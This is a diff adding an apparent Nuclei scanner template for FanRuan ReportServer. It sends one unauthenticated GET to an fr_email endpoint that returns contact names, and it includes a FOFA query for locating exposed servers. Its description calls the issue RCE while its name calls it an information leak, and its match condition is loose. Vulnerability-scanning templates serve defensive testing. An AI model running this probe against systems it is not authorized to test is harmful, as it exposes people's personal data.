@@ -1,0 +1,35 @@
+id: fanruan-ReportServer-fr-email
+info:
+  tags: fanruan-ReportServer-fr-email
+  name: 帆软系统ReportServer存在人员信息泄露
+  author: xc
+  severity: high
+  description: |-
+    fofa: body="isSupportForgetPwd"
+    帆软工具软件存在RCE 访问URL:/webroot/decision/view/report?op=fr_email&cmd=get_contacts_name
+
+
+
+http:
+  - raw:
+      - |
+        GET /webroot/decision/view/report?op=fr_email&cmd=get_contacts_name HTTP/1.1
+        Host: {{Hostname}}
+
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'text'
+      - type: status
+        status: 
+          - 200
+
+
+
+
+
